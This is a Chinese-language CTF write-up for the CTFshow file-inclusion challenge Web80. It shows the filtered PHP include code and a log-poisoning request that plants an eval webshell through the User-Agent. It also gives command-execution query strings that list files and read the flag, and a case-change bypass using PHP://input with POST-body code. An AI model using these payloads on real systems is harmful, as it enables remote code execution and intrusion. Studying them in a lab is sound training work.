# CTFshow 文件包含

**题目范围：Web78 - Web88 | Web116 - Web117**





## Web 80

代码如下：

```php
<?php
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
} else {
    highlight_file(__FILE__);
}
?>
```

本关过滤了php和data应该是不允许使用伪协议，但是可以正常包含，采用包含日志文件的方式。

日志文件中包含了 url以及ua信息等，这里ua最容易控制，抓包改ua，写入一句话即可。如下第三行

```http
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
Connection: close
```

可以直接命令执行即可也可以用webshell后门工具连接（蚁剑连接不上是怎么回事）

```
?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();
?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();
```

寻找PHPinfo信息前面的那一段信息即可找到



**另一种方法：**

对于php 和data 已经被过滤掉了，所以都不能用，但是用POST 的方法，还能用，为了不被过滤，php://input 改成PHP://input

GET方法改为POST方法最后添加一行，内容是需要包含的php代码。执行为：

/?file=PHP://input HTTP/1.1

POST数据部分：<?php system('ls *.php');?>



